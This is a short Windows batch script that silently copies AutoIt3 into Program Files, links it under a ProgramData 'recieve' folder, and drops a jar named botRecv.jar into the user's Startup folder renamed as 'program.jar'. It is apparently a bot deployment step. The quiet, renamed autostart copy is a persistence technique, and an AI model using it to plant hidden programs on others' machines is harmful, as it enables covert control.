echo D | xcopy "%~dp0\\AutoIt3" "C:\Program Files (x86)\AutoIt3" /s/h/e/k/f/c 1>nul

mkdir "C:\\ProgramData\\recieve\\"
mklink "C:\\ProgramData\\recieve\\Autoit3.lnk" "C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe"

copy "%~dp0\\deploy\\botRecv.jar" "%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.jar"